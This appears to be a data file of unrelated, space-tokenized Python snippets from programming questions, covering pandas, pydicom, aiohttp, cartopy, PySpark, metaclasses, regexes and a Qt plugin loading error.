"Exception happened during processing of request from ( '127.0.0.1 ' , 57011 ) Traceback ( most recent call last ) : File `` /usr/lib/python2.7/SocketServer.py '' , line 284 , in _handle_request_noblock self.process_request ( request , client_address ) File `` /usr/lib/python2.7/SocketServer.py '' , line 310 , in process_request self.finish_request ( request , client_address ) File `` /usr/lib/python2.7/SocketServer.py '' , line 323 , in finish_request self.RequestHandlerClass ( request , client_address , self ) File `` /usr/local/google_appengine/google/appengine/tools/dev_appserver.py '' , line 2438 , in __init__ BaseHTTPServer.BaseHTTPRequestHandler.__init__ ( self , *args , **kwargs ) File `` /usr/lib/python2.7/SocketServer.py '' , line 641 , in __init__ self.finish ( ) File `` /usr/lib/python2.7/SocketServer.py '' , line 694 , in finish self.wfile.flush ( ) File `` /usr/lib/python2.7/socket.py '' , line 303 , in flush self._sock.sendall ( view [ write_offset : write_offset+buffer_size ] ) error : [ Errno 32 ] Broken pipe"
"a = np.array ( [ [ 1. , 0.9 , 1 . ] , [ 0.9 , 0.9 , 1 . ] , [ 0.8 , 1. , 0.5 ] , [ 1. , 0.3 , 0.2 ] , [ 1. , 0.2 , 0.1 ] , [ 0.9 , 1. , 1 . ] , [ 1. , 0.9 , 1 . ] , [ 0.6 , 0.9 , 0.7 ] , [ 1. , 0.9 , 0.8 ] , [ 1. , 0.8 , 0.9 ] ] ) idx = pd.date_range ( '2017 ' , periods=a.shape [ 0 ] ) df = pd.DataFrame ( a , index=idx , columns=list ( 'abc ' ) ) df.idxmin ( ) a 2017-01-07b 2017-01-03c 2017-01-02dtype : datetime64 [ ns ]"
"import pydicom as dicomimport osimport matplotlib.pyplot as pltimport sysimport globimport numpy as nppath = `` ./Case2 '' ct_images = os.listdir ( path ) slices = [ dicom.read_file ( path + '/ ' + s , force=True ) for s in ct_images ] slices [ 0 ] .ImagePositionPatient [ 2 ] slices = sorted ( slices , key = lambda x : x.ImagePositionPatient [ 2 ] ) # print ( slices ) # Read a dicom file with a ctx managerwith dicom.dcmread ( path + '/ ' + ct_images [ 0 ] ) as ds : # plt.imshow ( ds.pixel_array , cmap=plt.cm.bone ) print ( ds ) # plt.show ( ) fig = plt.figure ( ) for num , each_slice in enumerate ( slices [ :12 ] ) : y= fig.add_subplot ( 3,4 , num+1 ) # print ( each_slice ) y.imshow ( each_slice.pixel_array ) plt.show ( ) for i in range ( len ( ct_images ) ) : with dicom.dcmread ( path + '/ ' + ct_images [ i ] , force=True ) as ds : plt.imshow ( ds.pixel_array , cmap=plt.cm.bone ) plt.show ( ) # pixel aspects , assuming all slices are the sameps = slices [ 0 ] .PixelSpacingss = slices [ 0 ] .SliceThicknessax_aspect = ps [ 1 ] /ps [ 0 ] sag_aspect = ps [ 1 ] /sscor_aspect = ss/ps [ 0 ] # create 3D arrayimg_shape = list ( slices [ 0 ] .pixel_array.shape ) img_shape.append ( len ( slices ) ) img3d = np.zeros ( img_shape ) # fill 3D array with the images from the filesfor i , s in enumerate ( slices ) : img2d = s.pixel_array img3d [ : , : , i ] = img2d # plot 3 orthogonal slicesa1 = plt.subplot ( 2 , 2 , 1 ) plt.imshow ( img3d [ : , : , img_shape [ 2 ] //2 ] ) a1.set_aspect ( ax_aspect ) a2 = plt.subplot ( 2 , 2 , 2 ) plt.imshow ( img3d [ : , img_shape [ 1 ] //2 , : ] ) a2.set_aspect ( sag_aspect ) a3 = plt.subplot ( 2 , 2 , 3 ) plt.imshow ( img3d [ img_shape [ 0 ] //2 , : , : ] .T ) a3.set_aspect ( cor_aspect ) plt.show ( )"
"> > > import asyncio > > > import aiohttp > > > > > > async def get ( session , url ) : ... async with session.request ( 'GET ' , url ) as resp : ... t = await resp.text ( ) ... return t ... > > > async def bulk_as_completed ( urls ) : ... async with aiohttp.ClientSession ( ) as session : ... aws = [ get ( session , url ) for url in urls ] ... for future in asyncio.as_completed ( aws ) : ... for i in ( 'cancelled ' , 'exception ' , 'result ' ) : ... print ( hasattr ( future , i ) ) ... print ( type ( future ) ) ... try : ... result = await future ... except : ... pass ... else : ... print ( type ( result ) ) ... print ( ) ... > > > > > > urls = ( ... 'https : //docs.python.org/3/library/asyncio-task.html ' , ... 'https : //docs.python.org/3/library/select.html ' , ... 'https : //docs.python.org/3/library/this-page-will-404.html ' , ... ) > > > > > > asyncio.run ( bulk_as_completed ( urls ) ) FalseFalseFalse < class 'coroutine ' > < class 'str ' > FalseFalseFalse < class 'coroutine ' > < class 'str ' > FalseFalseFalse < class 'coroutine ' > < class 'str ' > urls = ( 'https : //docs.python.org/3/library/asyncio-task.html ' , 'https : //docs.python.org/3/library/select.html ' , 'https : //docs.python.org/3/library/this-page-will-404.html ' , # This URL will raise on session.request ( ) . How can I propagate # that exception to the iterator of results ? 'https : //asdfasdfasdf-does-not-exist-asdfasdfasdf.com ' ) async def bulk_as_completed ( urls ) : async with aiohttp.ClientSession ( ) as session : aws = [ get ( session , url ) for url in urls ] for future in asyncio.as_completed ( aws ) : if future.cancelled ( ) : res = futures.CancelledError ( ) else : exc = future.exception ( ) if exc is not None : res = exc else : res = future.result ( ) # ... # [ Do something with ` res ` ]"
"# Okay : with Foo ( ) as f1 : f1.func1 ( ) f1.func2 ( ) # Not okay : f2 = Foo ( ) f2.func1 ( ) class Foo ( object ) : def __init__ ( self ) : self._entered = False def __enter__ ( self ) : self._entered = True return self def _verify_entered ( self ) : if not self._entered : raise Exception ( `` Did n't get call to __enter__ '' ) def __exit__ ( self , typ , val , traceback ) : self._verify_entered ( ) print ( `` In __exit__ '' ) def func1 ( self ) : self._verify_entered ( ) # do stuff ... def func2 ( self ) : self._verify_entered ( ) # do other stuff"
"a-2=b ( c-d ) =3 - , = , ( , - , ) , = re.finditer ( r ' [ =+/- ( ) ] * ' , text )"
try : while True : foo ( next ( a_generator ) ) except StopIteration : pass for outer_item in a_generator : if should_inner_loop ( outer_item ) : for inner_item in a_generator : foo ( inner_item ) if stop_inner_loop ( inner_item ) : break else : bar ( outer_item )
"def outer ( ) : x = 1 def inner ( ) : print `` Local variables : % s '' % locals ( ) return inner ( ) print outer ( ) def outer ( ) : x = 1 def inner ( ) : print x print `` Local variables : % s '' % locals ( ) return inner ( ) print outer ( ) 1Local variables : { ' x ' : 1 } def outer ( ) : x = 1 def inner ( ) : print x print `` Local variables : % s '' % locals ( ) del x return inner ( ) print outer ( ) > > > outer ( ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < stdin > '' , line 7 , in outer File `` < stdin > '' , line 4 , in innerUnboundLocalError : local variable ' x ' referenced before assignment > > >"
"import pandas as pd import matplotlib.pyplot as pltimport numpy as npd = { 'group 1 ' : [ 1 , 2 , 5 , 7 , 4 , 5 , 10 ] , 'group 2 ' : [ 5 , 6 , 1 , 8 , 2 , 6 , 2 ] , 'group 3 ' : [ 12 , 2 , 2 , 4 , 4 , 8 , 4 ] } df = pd.DataFrame ( d ) ax = df.plot.barh ( stacked=True , figsize= ( 10,12 ) ) for p in ax.patches : ax.annotate ( str ( p.get_x ( ) ) , xy= ( p.get_x ( ) , p.get_y ( ) +0.2 ) ) plt.legend ( bbox_to_anchor= ( 0 , -0.15 ) , loc=3 , prop= { 'size ' : 14 } , frameon=False )"
"df1 = pd.DataFrame ( { 'col1 ' : [ 'cat ' , 'cat ' , 'dog ' , 'green ' , 'blue ' ] } ) dfoutput = pd.DataFrame ( { 'col1 ' : [ 'cat ' , 'cat ' , 'dog ' , 'green ' , 'blue ' ] , 'col2 ' : [ 'animal ' , 'animal ' , 'animal ' , 'color ' , 'color ' ] } ) df1.loc [ df1 [ 'col1 ' ] == 'cat ' , 'col2 ' ] = 'animal'df1.loc [ df1 [ 'col1 ' ] == 'dog ' , 'col2 ' ] = 'animal ' df1.loc [ df1 [ 'col1 ' ] == 'cat ' | df1 [ 'col1 ' ] == 'dog ' , 'col2 ' ] = 'animal '"
transaction { // code in here . }
"grammar = Grammar ( `` '' '' program = expr* expr = _ `` { `` lvalue ( rvalue / expr ) * `` } '' _ lvalue = _ ~ '' [ a-z0-9\\- ] + '' _ rvalue = _ ~ '' .+ '' _ _ = ~ '' [ \\n\\s ] * '' `` '' '' ) print ( grammar.parse ( `` { do-something some-argument } '' ) ) Traceback ( most recent call last ) : File `` tests.py '' , line 13 , in < module > print ( grammar.parse ( `` { do-something some-argument } '' ) ) File `` /usr/local/lib/python2.7/dist-packages/parsimonious/grammar.py '' , line 112 , in parse return self.default_rule.parse ( text , pos=pos ) File `` /usr/local/lib/python2.7/dist-packages/parsimonious/expressions.py '' , line 109 , in parse raise IncompleteParseError ( text , node.end , self ) parsimonious.exceptions.IncompleteParseError : Rule 'program ' matched in its entirety , but it did n't consume all the text . The non-matching portion of the text begins with ' { do-something some- ' ( line 1 , column 1 ) ."
"codons = [ 'aug ' , 'uuu ' , 'uuc ' , 'uua ' , 'uug ' , 'ucu ' , 'ucc ' , 'uca ' , 'ucg ' , 'uau ' , 'uac ' , 'uaa ' , 'ugu ' , 'ugc ' , 'uga ' , 'ugg ' , 'cuu ' , 'cuc ' , 'cua ' , 'cug ' , 'ccu ' , 'ccc ' , 'cca ' , 'ccg ' , 'cau ' , 'cac ' , 'caa ' , 'cag ' , 'cgu ' , 'cgc ' , 'cga ' , 'cgg ' , 'auu ' , 'auc ' , 'aua ' , 'acu ' , 'acc ' , 'aca ' , 'acg ' , 'aau ' , 'aac ' , 'aaa ' , 'aag ' , 'agu ' , 'agc ' , 'aga ' , 'agg ' , 'guu ' , 'guc ' , 'gua ' , 'gug ' , 'gcu ' , 'gcc ' , 'gca ' , 'gcg ' , 'gau ' , 'gac ' , 'gaa ' , 'gag ' , 'ggu ' , 'ggc ' , 'gga ' , 'ggg ' , 'uag ' ] def codonNumToBase10 ( codonValue ) : numberOfChars = len ( codonValue ) # check to see if contains sets of threes if len ( codonValue ) % 3 ! = 0 : return -1 # check to see if it contains the correct characters for i in range ( 0 , numberOfChars ) : if codonValue [ i ] ! = ' a ' : if codonValue [ i ] ! = ' u ' : if codonValue [ i ] ! = ' c ' : if codonValue [ i ] ! = ' g ' : return -2 # populate an array with decimal versions of each codon in the input codonNumbers = [ ] base10Value = 0 numberOfCodons = int ( numberOfChars / 3 ) for i in range ( 0 , numberOfCodons ) : charVal = codonValue [ 0 + ( i*3 ) ] + codonValue [ 1 + ( i*3 ) ] + codonValue [ 2 + ( i*3 ) ] val = 0 for j in codons : if j == charVal : codonNumbers.append ( val ) break val += 1 base10Value += ( pow ( 64 , numberOfCodons - i - 1 ) ) * codonNumbers [ i ] return base10Valuedef base10ToCodonNum ( number ) : codonNumber = `` hitZeroCount = 0 while ( 1==1 ) : val = number % 64 number = int ( number / 64 ) codonNumber = codons [ val ] + codonNumber if number == 0 : if hitZeroCount > 0 : break hitZeroCount += 1 return codonNumberval_2011 = 'ccgcag'val_unknown = 'cgagag'print ( base10ToCodonNum ( codonNumToBase10 ( val_2011 ) ) , ' : : ' , codonNumToBase10 ( val_2011 ) ) print ( base10ToCodonNum ( codonNumToBase10 ( val_unknown ) ) , ' : : ' , codonNumToBase10 ( val_unknown ) )"
"Python 3.4.0 ( default , Apr 11 2014 , 13:05:11 ) > > > from collections import OrderedDict > > > dd = OrderedDict ( a=1 , b=2 ) > > > next ( reversed ( dd ) ) ' b ' > > > next ( reversed ( dd.keys ( ) ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : argument to reversed ( ) must be a sequence > > > next ( reversed ( dd.items ( ) ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : argument to reversed ( ) must be a sequence > > > next ( reversed ( dd.values ( ) ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : argument to reversed ( ) must be a sequence"
"import matplotlib.pyplot as pltimport cartopyimport cartopy.io.shapereader as shpreaderimport cartopy.crs as ccrsax = plt.axes ( projection=ccrs.PlateCarree ( ) ) ax.add_feature ( cartopy.feature.LAND ) ax.add_feature ( cartopy.feature.OCEAN ) ax.add_feature ( cartopy.feature.COASTLINE ) ax.add_feature ( cartopy.feature.BORDERS , linestyle='- ' , alpha=.5 ) ax.add_feature ( cartopy.feature.LAKES , alpha=0.95 ) ax.add_feature ( cartopy.feature.RIVERS ) ax.set_extent ( [ -150 , 60 , -25 , 60 ] ) shpfilename = shpreader.natural_earth ( resolution='110m ' , category='cultural ' , name='admin_0_countries ' ) reader = shpreader.Reader ( shpfilename ) countries = reader.records ( ) for country in countries : if country.attributes [ 'SOVEREIGNT ' ] == `` Bulgaria '' : ax.add_geometries ( country.geometry , ccrs.PlateCarree ( ) , facecolor= ( 0 , 1 , 0 ) , label = `` A '' ) else : ax.add_geometries ( country.geometry , ccrs.PlateCarree ( ) , facecolor= ( 1 , 1 , 1 ) , label = country.attributes [ 'SOVEREIGNT ' ] ) plt.rcParams [ `` figure.figsize '' ] = ( 50,50 ) plt.show ( ) ax.add_geometries ( country.geometry , ccrs.PlateCarree ( ) , facecolor= ( 0 , 1 , 0 ) , label = `` A '' )"
a = 1def my_fun ( x ) : print ( x ) print ( a ) my_fun ( 2 ) 21
"from pyspark.sql import *from pyspark.sql.types import *import pyspark.sql.functions as fnschema = StructType ( [ StructField ( 't ' , DoubleType ( ) ) , StructField ( 'value ' , DoubleType ( ) ) ] ) df = spark.createDataFrame ( sc.parallelize ( [ Row ( t=float ( i/10 ) , value=float ( i*i ) ) for i in range ( 1000 ) ] , 4 ) , # .cache ( ) , schema=schema , verifySchema=False ) .orderBy ( `` t '' ) # .cache ( )"
"def getResizedImage ( self , image , imagemaxWidth , imagemaxHeight ) : img = images.Image ( image_data=image ) logging.error ( img.get_original_metadata ( ) ) def getResizedImage ( self , image , imagemaxWidth , imagemaxHeight ) : img = images.Image ( image_data=image ) img.rotate ( 0 ) img.execute_transforms ( ) logging.error ( img.get_original_metadata ( ) ) { u'ImageLength ' : 480 , u'ImageWidth ' : 640 }"
"[ ( 't ' , ' h ' , ' i ' , 's ' , '\ue000 ' ) , ( ' c ' , ' o ' , ' r ' , ' p ' , ' u ' , 's ' , '\ue000 ' ) , ( ' i ' , ' n ' , '\ue000 ' ) , ( 't ' , ' x ' , 't ' , ' f ' , ' i ' , ' l ' , ' e ' , '\ue000 ' ) , ( 't ' , ' h ' , ' e ' , '\ue000 ' ) , ( 's ' , ' e ' , ' n ' , 't ' , ' e ' , ' n ' , ' c ' , ' e ' , '\ue000 ' ) , ( ' b ' , ' a ' , ' r ' , '\ue000 ' ) , ( ' a ' , ' n ' , 'd ' , '\ue000 ' ) , ( ' i ' , 's ' , '\ue000 ' ) , ( ' f ' , ' o ' , ' o ' , '\ue000 ' ) , ( ' f ' , ' i ' , ' r ' , 's ' , 't ' , '\ue000 ' ) , ( ' a ' , '\ue000 ' ) , ( ' . ' , '\ue000 ' ) ] [ ( 't ' , ' h ' , 'is ' , '\ue000 ' ) , ( ' c ' , ' o ' , ' r ' , ' p ' , ' u ' , 's ' , '\ue000 ' ) , ( ' i ' , ' n ' , '\ue000 ' ) , ( 't ' , ' x ' , 't ' , ' f ' , ' i ' , ' l ' , ' e ' , '\ue000 ' ) , ( 't ' , ' h ' , ' e ' , '\ue000 ' ) , ( 's ' , ' e ' , ' n ' , 't ' , ' e ' , ' n ' , ' c ' , ' e ' , '\ue000 ' ) , ( ' b ' , ' a ' , ' r ' , '\ue000 ' ) , ( ' a ' , ' n ' , 'd ' , '\ue000 ' ) , ( 'is ' , '\ue000 ' ) , ( ' f ' , ' o ' , ' o ' , '\ue000 ' ) , ( ' f ' , ' i ' , ' r ' , 's ' , 't ' , '\ue000 ' ) , ( ' a ' , '\ue000 ' ) , ( ' . ' , '\ue000 ' ) ] > > > cin [ ( 't ' , ' h ' , ' i ' , 's ' , '\ue000 ' ) , ( ' c ' , ' o ' , ' r ' , ' p ' , ' u ' , 's ' , '\ue000 ' ) , ( ' i ' , ' n ' , '\ue000 ' ) , ( 't ' , ' x ' , 't ' , ' f ' , ' i ' , ' l ' , ' e ' , '\ue000 ' ) , ( 't ' , ' h ' , ' e ' , '\ue000 ' ) , ( 's ' , ' e ' , ' n ' , 't ' , ' e ' , ' n ' , ' c ' , ' e ' , '\ue000 ' ) , ( ' b ' , ' a ' , ' r ' , '\ue000 ' ) , ( ' a ' , ' n ' , 'd ' , '\ue000 ' ) , ( ' i ' , 's ' , '\ue000 ' ) , ( ' f ' , ' o ' , ' o ' , '\ue000 ' ) , ( ' f ' , ' i ' , ' r ' , 's ' , 't ' , '\ue000 ' ) , ( ' a ' , '\ue000 ' ) , ( ' . ' , '\ue000 ' ) ] > > > [ tuple ( ' '.join ( i ) .replace ( ' '.join ( qtuple ) , `` .join ( qtuple ) ) .split ( ) ) for i in cin ] [ ( 't ' , ' h ' , 'is ' , '\ue000 ' ) , ( ' c ' , ' o ' , ' r ' , ' p ' , ' u ' , 's ' , '\ue000 ' ) , ( ' i ' , ' n ' , '\ue000 ' ) , ( 't ' , ' x ' , 't ' , ' f ' , ' i ' , ' l ' , ' e ' , '\ue000 ' ) , ( 't ' , ' h ' , ' e ' , '\ue000 ' ) , ( 's ' , ' e ' , ' n ' , 't ' , ' e ' , ' n ' , ' c ' , ' e ' , '\ue000 ' ) , ( ' b ' , ' a ' , ' r ' , '\ue000 ' ) , ( ' a ' , ' n ' , 'd ' , '\ue000 ' ) , ( 'is ' , '\ue000 ' ) , ( ' f ' , ' o ' , ' o ' , '\ue000 ' ) , ( ' f ' , ' i ' , ' r ' , 's ' , 't ' , '\ue000 ' ) , ( ' a ' , '\ue000 ' ) , ( ' . ' , '\ue000 ' ) ] import iofrom collections import Counterimport timeinfile = 'big.txt ' # comes from norvig.com/big.txtn = 2with io.open ( infile , ' r ' , encoding='utf8 ' ) as fin : text = fin.read ( ) .lower ( ) .replace ( u ' ' , u '' \uE000 '' ) for j in range ( 1,6400 ) : unused_char = unichr ( ord ( u'\uE001 ' ) + j ) start = time.time ( ) char_bigrams = zip ( * [ text [ i : ] for i in range ( n ) ] ) bigram_time = time.time ( ) - start start = time.time ( ) most_freq_bigram = Counter ( filter ( lambda x : u '' \uE000 '' not in x and '\n ' not in x , char_bigrams ) ) .most_common ( 1 ) [ 0 ] [ 0 ] max_time = time.time ( ) - start start = time.time ( ) text = text.replace ( `` .join ( most_freq_bigram ) , unused_char ) replace_time = time.time ( ) - start print j , `` .join ( most_freq_bigram ) , most_freq_bigram , bigram_time , max_time , replace_time print text 1 th ( u't ' , u ' h ' ) 0.896255016327 3.28389787674 0.02530694007872 e ( u'\ue002 ' , u ' e ' ) 1.47053217888 3.16544914246 0.02807497978213 in ( u ' i ' , u ' n ' ) 1.13404297829 3.10529899597 0.02455592155464 an ( u ' a ' , u ' n ' ) 1.20013689995 3.63801002502 0.02428913116465 er ( u ' e ' , u ' r ' ) 1.41387891769 3.13376092911 0.02375912666326 on ( u ' o ' , u ' n ' ) 1.22826981544 3.06997895241 0.02273011207587 re ( u ' r ' , u ' e ' ) 1.21916294098 2.97599196434 0.02380418777478 at ( u ' a ' , u't ' ) 1.14608097076 2.97988891602 0.02265214920049 en ( u ' e ' , u ' n ' ) 1.20747494698 2.88649988174 0.01905488967910 ed ( u ' e ' , u'd ' ) 1.16296696663 2.8995718956 0.019827127456711 is ( u ' i ' , u's ' ) 1.17692494392 3.02292394638 0.022850036621112 d ( u'\ue005 ' , u'd ' ) 1.13779211044 2.85169506073 0.0229239463806 Counter ( filter ( lambda x : u '' \uE000 '' not in x and '\n ' not in x , char_bigrams ) ) .most_common ( 1 ) [ 0 ] [ 0 ]"
"[ ( 1 ) , ( 1,4 ) , ( 1,5 ) , ( 1,6 ) , ( 1,7 ) , ( 1,8 ) , ( 1,9 ) , ( 1,4,7 ) , ( 1,4,8 ) , ( 1,4,9 ) , ( 1,5,7 ) , ( 1,5,8 ) , ( 1,5,9 ) , ( 1,6,7 ) , ( 1,6,8 ) , ( 1,6,9 ) , ( 2 ) , ... , ( 3 ) , ... , ( 4 ) , ( 4,7 ) , ( 4,8 ) , ( 4,9 ) , ( 5 ) , ( 5,7 ) , ( 5,8 ) , ( 5,9 ) , ( 6 ) , ( 6,7 ) , ( 6,8 ) , ( 6,9 ) , ( 7 ) , ( 8 ) , ( 9 ) ]"
"df = pd.DataFrame ( dict ( A=list ( 'XXYYXXYY ' ) , B=range ( 8 , 0 , -1 ) ) ) print ( df ) A B0 X 81 X 72 Y 63 Y 54 X 45 X 36 Y 27 Y 1 A B5 X 3 < -- Notice all X are in same positions4 X 4 < -- However , ` [ 3 , 4 , 7 , 8 ] ` have shifted7 Y 16 Y 21 X 7 < -- 0 X 8 < -- 3 Y 52 Y 6"
"class Foo ( object ) : `` '' '' My doc string `` '' '' @ classmethod def default_attributes ( cls ) : return { 'foo ' : 'description of foo attribute ' , 'bar ' : 'description of bar attribute ' } @ classmethod def attributes_string ( cls ) : attributes = cls.default_attributes ( ) result = '\nDefault Attributes : \n ' for key , value in attributes.iteritems ( ) : result += ' % s : % s\n ' % ( key , value ) return resultprint Foo.__doc__ My doc stringDefault Attributes : foo : description of foo attributebar : description of bar attribute def my_decorator ( cls ) : doc = getattr ( cls , '__doc__ ' , `` ) doc += cls.attributes_string ( ) cls.__doc__ = doc return cls @ my_decoratorclass Foo ( object ) : `` '' '' My doc string `` '' '' AttributeError : attribute '__doc__ ' of 'type ' objects is not writable class Meta ( type ) : def __new__ ( meta_cls , name , bases , cls_dict ) : tmpcls = super ( Meta , meta_cls ) .__new__ ( meta_cls , name , bases , cls_dict ) doc = cls_dict.get ( '__doc__ ' , `` ) doc += tmpcls.attributes_string ( ) cls_dict [ '__doc__ ' ] = doc return super ( Meta , meta_cls ) .__new__ ( meta_cls , name , bases , cls_dict ) class Foo ( object ) : `` '' '' My doc string `` '' '' __metaclass__ = Meta My doc stringDefault Attributes : foo : description of foo attributebar : description of bar attribute"
"a = re.compile ( r '' '' '' \d + # the integral part \ . # the decimal point \d * # some fractional digits '' '' '' , re.X ) a = re.compile ( r'\d+ ' # integral part r'\ . ' # decimal point r'\d* ' # optional fractional digits )"
"a = ( fcn1 ( ) , fcn2 ( ) ) b = [ fcn1 ( ) , fcn2 ( ) ]"
"c = np.array ( close ) EMA50 = np.array ( MA50 ) sublist = [ False , True , True ] biglist = ( c-EMA50 ) /c > 0.01 > > > array ( [ False , False , False , False , False , False , False , False , False , False , False , False , False , True , True , True , True , True , True , True , True , True , True , True , True , True , True , True , False , False , True , False , True , True , False , False , True , False , False , False , False , False , False , False , True , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , True , True , True , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , False , True , True , True , True ] , dtype=bool ) > > > sublist in biglist > > > False index_loc = [ 12,31,68,112 ]"
"This application failed to start because it could not find or load the Qt platform plugin `` xcb '' .Available platform plugins are : linuxfb , minimal , offscreen , xcb . linux-vdso.so.1 = > ( 0x00007fff563a3000 ) libQt5XcbQpa.so.5 = > not foundlibdl.so.2 = > /lib/x86_64-linux-gnu/libdl.so.2 ( 0x00007feddfeee000 ) libX11-xcb.so.1 = > /usr/lib/x86_64-linux-gnu/libX11-xcb.so.1 ( 0x00007feddfcec000 ) libXi.so.6 = > /usr/lib/x86_64-linux-gnu/libXi.so.6 ( 0x00007feddfadc000 ) libSM.so.6 = > /usr/lib/x86_64-linux-gnu/libSM.so.6 ( 0x00007feddf8d4000 ) libICE.so.6 = > /usr/lib/x86_64-linux-gnu/libICE.so.6 ( 0x00007feddf6b8000 ) libxcb.so.1 = > /usr/lib/x86_64-linux-gnu/libxcb.so.1 ( 0x00007feddf499000 ) libfontconfig.so.1 = > /usr/lib/x86_64-linux-gnu/libfontconfig.so.1 ( 0x00007feddf25d000 ) libfreetype.so.6 = > /usr/lib/x86_64-linux-gnu/libfreetype.so.6 ( 0x00007feddefba000 ) libQt5DBus.so.5 = > /usr/lib/x86_64-linux-gnu/libQt5DBus.so.5 ( 0x00007fedded3b000 ) libgthread-2.0.so.0 = > /usr/lib/x86_64-linux-gnu/libgthread-2.0.so.0 ( 0x00007feddeb39000 ) librt.so.1 = > /lib/x86_64-linux-gnu/librt.so.1 ( 0x00007fedde931000 ) libglib-2.0.so.0 = > /lib/x86_64-linux-gnu/libglib-2.0.so.0 ( 0x00007fedde629000 ) libXrender.so.1 = > /usr/lib/x86_64-linux-gnu/libXrender.so.1 ( 0x00007fedde41f000 ) libXext.so.6 = > /usr/lib/x86_64-linux-gnu/libXext.so.6 ( 0x00007fedde20d000 ) libX11.so.6 = > /usr/lib/x86_64-linux-gnu/libX11.so.6 ( 0x00007feddded8000 ) libQt5Gui.so.5 = > /usr/lib/x86_64-linux-gnu/libQt5Gui.so.5 ( 0x00007feddd88b000 ) libQt5Core.so.5 = > /usr/lib/x86_64-linux-gnu/libQt5Core.so.5 ( 0x00007feddd1e5000 ) libGL.so.1 = > /usr/lib/x86_64-linux-gnu/mesa/libGL.so.1 ( 0x00007feddcf53000 ) libpthread.so.0 = > /lib/x86_64-linux-gnu/libpthread.so.0 ( 0x00007feddcd35000 ) libstdc++.so.6 = > /usr/lib/x86_64-linux-gnu/libstdc++.so.6 ( 0x00007feddca31000 ) libm.so.6 = > /lib/x86_64-linux-gnu/libm.so.6 ( 0x00007feddc72b000 ) libgcc_s.so.1 = > /lib/x86_64-linux-gnu/libgcc_s.so.1 ( 0x00007feddc515000 ) libc.so.6 = > /lib/x86_64-linux-gnu/libc.so.6 ( 0x00007feddc150000 ) /lib64/ld-linux-x86-64.so.2 ( 0x00007fede02f4000 ) libuuid.so.1 = > /lib/x86_64-linux-gnu/libuuid.so.1 ( 0x00007feddbf4b000 ) libXau.so.6 = > /usr/lib/x86_64-linux-gnu/libXau.so.6 ( 0x00007feddbd47000 ) libXdmcp.so.6 = > /usr/lib/x86_64-linux-gnu/libXdmcp.so.6 ( 0x00007feddbb41000 ) libexpat.so.1 = > /lib/x86_64-linux-gnu/libexpat.so.1 ( 0x00007feddb917000 ) libz.so.1 = > /lib/x86_64-linux-gnu/libz.so.1 ( 0x00007feddb6fe000 ) libpng12.so.0 = > /lib/x86_64-linux-gnu/libpng12.so.0 ( 0x00007feddb4d8000 ) libdbus-1.so.3 = > /lib/x86_64-linux-gnu/libdbus-1.so.3 ( 0x00007feddb293000 ) libpcre.so.3 = > /lib/x86_64-linux-gnu/libpcre.so.3 ( 0x00007feddb055000 ) libharfbuzz.so.0 = > /usr/lib/x86_64-linux-gnu/libharfbuzz.so.0 ( 0x00007feddae00000 ) libicui18n.so.52 = > /usr/lib/x86_64-linux-gnu/libicui18n.so.52 ( 0x00007fedda9f9000 ) libicuuc.so.52 = > /usr/lib/x86_64-linux-gnu/libicuuc.so.52 ( 0x00007fedda680000 ) libglapi.so.0 = > /usr/lib/x86_64-linux-gnu/libglapi.so.0 ( 0x00007fedda456000 ) libXdamage.so.1 = > /usr/lib/x86_64-linux-gnu/libXdamage.so.1 ( 0x00007fedda253000 ) libXfixes.so.3 = > /usr/lib/x86_64-linux-gnu/libXfixes.so.3 ( 0x00007fedda04d000 ) libxcb-glx.so.0 = > /usr/lib/x86_64-linux-gnu/libxcb-glx.so.0 ( 0x00007fedd9e36000 ) libxcb-dri2.so.0 = > /usr/lib/x86_64-linux-gnu/libxcb-dri2.so.0 ( 0x00007fedd9c31000 ) libxcb-dri3.so.0 = > /usr/lib/x86_64-linux-gnu/libxcb-dri3.so.0 ( 0x00007fedd9a2e000 ) libxcb-present.so.0 = > /usr/lib/x86_64-linux-gnu/libxcb-present.so.0 ( 0x00007fedd982b000 ) libxcb-sync.so.1 = > /usr/lib/x86_64-linux-gnu/libxcb-sync.so.1 ( 0x00007fedd9625000 ) libxshmfence.so.1 = > /usr/lib/x86_64-linux-gnu/libxshmfence.so.1 ( 0x00007fedd9423000 ) libXxf86vm.so.1 = > /usr/lib/x86_64-linux-gnu/libXxf86vm.so.1 ( 0x00007fedd921d000 ) libdrm.so.2 = > /usr/lib/x86_64-linux-gnu/libdrm.so.2 ( 0x00007fedd9011000 ) libgraphite2.so.3 = > /usr/lib/x86_64-linux-gnu/libgraphite2.so.3 ( 0x00007fedd8df5000 ) libicudata.so.52 = > /usr/lib/x86_64-linux-gnu/libicudata.so.52 ( 0x00007fedd7588000 ) linux-vdso.so.1 = > ( 0x00007fffc812e000 ) libpython3.4m.so.1.0 = > /home/daniele/Desktop/eddy/build/Eddy-0.4-gpl-linux64/./libpython3.4m.so.1.0 ( 0x00007fab72345000 ) libpthread.so.0 = > /lib/x86_64-linux-gnu/libpthread.so.0 ( 0x00007fab72127000 ) libc.so.6 = > /lib/x86_64-linux-gnu/libc.so.6 ( 0x00007fab71d62000 ) libexpat.so.1 = > /lib/x86_64-linux-gnu/libexpat.so.1 ( 0x00007fab71b38000 ) libz.so.1 = > /lib/x86_64-linux-gnu/libz.so.1 ( 0x00007fab7191f000 ) libdl.so.2 = > /lib/x86_64-linux-gnu/libdl.so.2 ( 0x00007fab7171b000 ) libutil.so.1 = > /lib/x86_64-linux-gnu/libutil.so.1 ( 0x00007fab71518000 ) libm.so.6 = > /lib/x86_64-linux-gnu/libm.so.6 ( 0x00007fab71212000 ) /lib64/ld-linux-x86-64.so.2 ( 0x00007fab7297a000 )"
"def match_pictures_with_products ( queryset , number_of_images = 3 ) : products = [ ] i = 0 for product in queryset : if i < ( number_of_images ) : image = product.imagemain_set.all ( ) [ :1 ] product.photo_url = image [ 0 ] .photo.url products.append ( product ) i += 1 return products def index ( request ) : `` '' '' returns the top 10 most clicked products '' '' '' products = Product.objects.all ( ) [ :10 ] products = match_pictures_with_products ( products , 10 ) . return render_to_response ( 'products/product_list.html ' , { 'products ' : products } )"
